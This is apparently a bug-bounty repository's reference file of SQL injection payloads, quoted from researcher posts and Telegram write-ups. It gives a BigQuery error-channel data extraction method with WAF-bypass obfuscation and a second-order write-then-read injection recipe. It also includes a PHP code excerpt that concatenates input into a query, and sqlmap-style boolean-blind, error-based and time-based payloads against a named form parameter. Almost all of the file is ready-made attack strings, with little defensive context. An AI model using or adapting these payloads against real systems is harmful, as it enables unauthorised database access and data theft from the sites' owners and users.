# Payloads — sqli

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Unauthenticated BigQuery SQLi via WAF-bypassing error-channel extraction ($4,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2110355630133322159
- Sources: `posts/infinitelogins/2026-10-14-2110355630133322159.md`

```
JSON param with `'`; boolean: `IF TRUE THEN ASSERT FALSE; END IF;` → 500 vs FALSE → 200; extract: `RAISE USING MESSAGE = <query result>`; WAF bypass: `EXECUTE/**/IMMEDIATE` and `REVERSE('AMEHCS_NOITAMROFNI')`
```

## 1. Unauthenticated SQL injection in a public quote flow ($4,000)
- Researcher: @mdp_sec
- Post: https://x.com/mdp_sec/status/2120066429223317560
- Sources: `posts/mdp_sec/2026-11-10-2120066429223317560.md`, `writeups/mdp_sec/bug-bounty-hunting-prompts-readme.md`, `writeups/mdp_sec/mdpsec-home.md`, `writeups/mdp_sec/mdpsec-privacy.md`, `writeups/mdp_sec/mdpsec-security-test.md`, `writeups/mdp_sec/platform-reports.md`

```
POST JSON to the public /retrieve endpoint; inject into the reflected field; stage a record under a controlled reference; GET the reference back to read DB-evaluated columns (second-order / write-then-read-back)
```

## 2. SQL Injection through /include/findusers.php
- Source: `telegram writeups (verbatim excerpts)`

```
461.		public function getUsersByGroupLink($groups, $criteria = null, $asobject = false, $id_as_key = false) {
462.			$ret = array();
463.	
464.			$select = $asobject ? "u.*" : "u.uid";
465.			$sql[] = "	SELECT DISTINCT {$select} "
466.					. "	FROM " . icms::$xoopsDB->prefix("users") . " AS u"
467.					. " LEFT JOIN " . icms::$xoopsDB->prefix("groups_users_link") . " AS m ON m.uid = u.uid"
468.					. "	WHERE 1 = '1'";
469.			if (! empty($groups)) {
470.				$sql[] = "m.groupid IN (" . implode(", ", $groups) . ")";
471.			}
```

## 3. SQL injection at [] [HtUS]
- Source: `telegram writeups (verbatim excerpts)`

```
Parameter: scn (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47636148 FROM DUAL WHERE 1321=1321 AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (ELT(7303=7303,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47774954 FROM DUAL WHERE 5475=5475 AND (SELECT 6347 FROM (SELECT(SLEEP(5)))eoxH))||'
---
```
